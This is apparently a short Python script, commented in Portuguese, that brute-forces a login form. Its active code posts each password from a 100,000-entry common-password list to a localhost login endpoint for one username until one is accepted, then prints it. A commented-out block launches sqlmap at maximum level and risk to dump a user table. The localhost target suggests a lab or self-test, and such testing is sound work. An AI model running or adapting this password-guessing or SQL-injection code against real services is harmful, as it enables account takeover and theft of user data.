import requests
import json
import time

# import subprocess

# def executar_sqlmap(url):
#     # Substitua 'Caminho/Para/Sqlmap' pelo caminho real onde o 'sqlmap' está instalado no seu sistema
#     #'C:\Users\Cliente\Desktop\sqlmapproject-sqlmap-f176266\sqlmap.py'
#     caminho_sqlmap = r'C:\Users\Cliente\Desktop\sqlmapproject-sqlmap-f176266\sqlmap.py'
    
#     comando_sqlmap = f"sqlmap -u {url} -D flask --level 5 --risk 3 --dbms=mysql -T usuario"
    
#     processo = subprocess.Popen(comando_sqlmap, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)
#     saida, erro = processo.communicate(input='')
    
#     return saida, erro

# # Substitua 'http://exemplo.com/pagina' pela URL que você deseja testar
# url_alvo = 'http://localhost:3000/info?login=admin'
# print("executando sqlmap")

# saida_sqlmap, erro_sqlmap = executar_sqlmap(url_alvo)

# # Aqui, você pode processar a saída ou o erro conforme necessário
# print("Saída do SQLMap:")
# print(saida_sqlmap)

# print("Erro do SQLMap:")
# print(erro_sqlmap)


with open('100kMostUsed.txt', 'r', encoding='utf-8') as file:
    rows = [(row.strip(), row_number) for row_number, row in enumerate(file, start=1)]

url = "http://localhost:3000/login"
start_time = time.time()


for row in rows:
    try:
        response = requests.post(url, json={"login": "josuee", "password": row[0]}, headers={"Content-Type": "application/json"})

        if response.status_code == 200:
            print(f"Logado com sucesso!")
            end_time = time.time()
            elapsed_time = end_time - start_time
            print(f"Tempo decorrido: {elapsed_time:.2f} segundos, senha é {row[0]}")
            break
        else:
            if row[1] % 10 == 0:
                print(f"{row[1]} senhas testadas")

    except Exception as e:
        print(f"Erro ao enviar requisição: {e}")

# Se não encontrou a senha correta
else:
    print("Senha não encontrada.")

# O restante do seu código continua aqui...
